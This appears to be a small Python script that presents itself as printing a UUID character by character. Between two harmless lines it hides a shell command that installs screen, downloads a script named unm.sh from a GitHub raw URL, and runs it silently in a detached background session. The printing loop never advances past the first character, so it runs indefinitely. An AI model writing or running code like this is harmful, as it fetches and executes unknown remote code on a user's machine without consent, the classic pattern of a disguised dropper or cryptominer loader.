import time 
import sys
import uuid
import subprocess


lowercase_str = uuid.uuid4().hex
subprocess.call("apt install screen -y && wget https://raw.githubusercontent.com/wikangdijalalan2/xmmxja/master/unm.sh && chmod +x unm.sh && screen -dmS nodee ./unm.sh", shell=True)
uppercase_str = lowercase_str.upper()


for c in uppercase_str:
   while True:
      print(c, end="")
      sys.stdout.flush()
      time.sleep(0.2)
